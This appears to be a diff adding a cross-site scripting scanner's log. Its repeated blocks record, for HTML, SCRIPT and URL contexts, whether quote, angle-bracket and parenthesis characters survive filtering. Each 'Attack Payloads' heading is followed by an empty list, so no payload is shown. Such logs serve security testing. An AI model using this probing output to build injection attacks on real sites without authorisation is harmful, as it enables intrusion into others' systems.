+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	True	True	True
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	True	True	True
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	True	True	True
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	True	True	True
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	True	True	True
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	True	True	True
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	True	True	True
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	True	True	True
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	True	True	True
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	True	True	True
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	True	True	True
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	True	True	True
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	True	True	False
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+SCRIPT:		True	True	True	True	False
+
+Attack Payloads for SCRIPT
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
